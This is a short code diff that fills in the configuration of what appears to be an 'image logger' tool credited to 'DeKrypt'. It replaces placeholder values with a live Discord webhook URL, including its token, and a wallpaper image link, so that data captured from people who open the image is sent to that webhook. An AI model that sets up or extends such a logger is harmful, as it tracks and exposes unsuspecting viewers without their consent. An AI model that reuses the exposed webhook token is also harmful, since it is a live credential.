@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1445092353688993988/sJzGpOlPzvZPUvKm0PxWmDkPJUW3AqL7XQ7hW1ihAyrcsuLj9JXFwQXnxJyXLINDfbXZ",
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=jkZEsJfH&id=18028951FB30F47C22F9140B2C50CD1AD7285147&thid=OIP.jkZEsJfHqwR0vE2vWt0wcQHaEK&mediaurl=https%3A%2F%2F4kwallpapers.com%2Fimages%2Fwallpapers%2Fkali-linux-3840x2160-18058.jpg&cdnurl=https%3A%2F%2Fth.bing.com%2Fth%2Fid%2FR.8e4644b097c7ab0474bc4daf5add3071%3Frik%3DR1Eo1xrNUCwLFA%26pid%3DImgRaw%26r%3D0&exph=2160&expw=3840&q=Kali+Linux+Wallpaper+4K+with+Coding&FORM=IRPRST&ck=B6F1B92C09FC8C4E77B2BA7117507C72&selectedIndex=24&itb=0&cw=1721&ch=832&mode=overlay", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
